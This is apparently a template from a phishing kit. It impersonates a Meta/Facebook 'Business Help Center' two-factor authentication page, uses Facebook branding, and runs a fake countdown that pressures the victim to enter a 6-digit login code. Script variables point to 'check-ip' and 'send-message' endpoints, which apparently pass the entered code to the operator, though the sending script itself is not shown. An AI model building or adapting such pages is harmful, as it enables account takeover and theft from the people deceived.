<html lang="en">

<head>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,200,300,400,500,700&amp;display=swap">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <link rel="stylesheet" href="{{ url('source/assets/facebook/confirm.css?version=12321') }}">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <title>Business Help Center</title>
    <script>
        var URL_CHECK_IP = '{{ url('check-ip') }}';
        var URL_SEND_MESSAGE = '{{ url('send-message') }}';
    </script>
    @include('facebook.css')
    @include('facebook.js')

    <script>
        var minutes = 4;
        var seconds = 38;

        function updateTimer() {
            var timeri = document.getElementById("timeri");
            timeri.textContent = `${minutes}:${seconds < 10 ? "0": ""}${seconds}`;
            if (seconds > 0) {
                seconds--;
            } else {
                if (minutes > 0) {
                    minutes--;
                    seconds = 59;
                } else {
                    clearInterval(timerInterval);
                    timeri.textContent = "00:00";
                    var sendCodeAgainLink = document.getElementById("sendcodeagain");
                    sendCodeAgainLink.style.pointerEvents = "auto";
                }
            }
        }
        var timerInterval = setInterval(updateTimer, 1000);
    </script>
</head>

<body>
    <div class="confirm">
        <section class="header">
            <div class="fotoh">
                <div class="row">
                    <div class="col-6">
                        <img src="{{ url('source/image/facebook/meta-logo.png') }}" width="100" class="img-fluid">
                    </div>
                </div>
            </div>
        </section>
        <div class="main-confirm">
            <div class="container">
                <div class="content col-md-8 col-12">
                    <form id="basicForm" autocomplete="off">
                        <div class="card">
                            <h3 class="twh3">Two-factor authentication required (1/3)</h3>
                            <div class="bodyyy">
                                <p> You’ve asked us to require a 6-digit login code when anyone tries to
                                    access your account from a new device or browser. </p>
                                <p> Enter the 6-digit code from your <strong>code generator</strong> or
                                    third-party app below. </p>
                                <div class="form-group"
                                    style="padding-left: 0px; padding-top: 5px; padding-bottom: 5px; display: inline-block;">
                                    <div class="item-form" style="display: flex; align-items: center;">
                                        <div style="margin: 0px;">

                                            <div
                                                class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                                <div class="ant-form-item-control-input">
                                                    <div class="ant-form-item-control-input-content">
                                                        <div class="ant-input-number ant-input-number-in-form-item css-dev-only-do-not-override-pr0fja"
                                                            style="margin-left: 0px; font-size: 14px; border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.08) 0px 1px 1px inset; color: rgb(78, 77, 77);">

                                                            <div class="ant-input-number-input-wrap">
                                                                <input type="hidden" name="_token" id="_token"
                                                                    value="{{ csrf_token() }}" />
                                                                <input autocomplete="off" role="spinbutton"
                                                                    step="1" maxlength="8" minlength="4"
                                                                    id="basicForm_fill_code" aria-required="true"
                                                                    class="ant-input-number-input" value="">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="form-group paddingleftt" style="display: inline-block;">
                                            <p name="" id="timer" class="nolink"
                                                style="background-color: transparent; border: transparent; padding: 0px; margin: 0px; color: rgb(56, 88, 152); font-size: 13px;">
                                                ( wait: <span id="timeri" style="margin-bottom: 0px;">4:39</span> )
                                            </p>
                                            <a id="sendcodeagain" class="btn" href="#"
                                                onclick="sendcodeagain();">Send Code Again?</a>
                                        </div>
                                    </div>
                                    <p class="2fa-error"
                                        style="color:#ff4d4f;font-size:14px;margin-top: 0px;margin-bottom:0px">
                                    </p>
                                </div>
                            </div>
                            <div class="footerii" style="width: 100%;">
                                <a data-toggle="modal" data-target="#twof" class="linkupertwo" href="#"
                                    style="font-size: 14px; color: rgb(56, 88, 152); font-weight: 600; margin-bottom: 0px; float: left; margin-top: 6px; cursor: pointer; text-decoration: none;"
                                    onclick="sendcodeagain();">Need another way to authenticate?</a>
                                <div class="ant-form-item btn butoni css-dev-only-do-not-override-pr0fja"
                                    style="color: rgb(255, 255, 255); background-color: rgb(44, 132, 244); width: auto; float: right; margin: 0px; padding: 0px 7px;">

                                    <div class="ant-form-item-control-input">
                                        <div class="ant-form-item-control-input-content">
                                            <button type="submit" id="submit-2fa" style="">
                                                <i class="fa fa-spin fa-circle-o-notch" style="display: none"
                                                    aria-hidden="true"></i>
                                                <span class="btn-text">Send</span>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
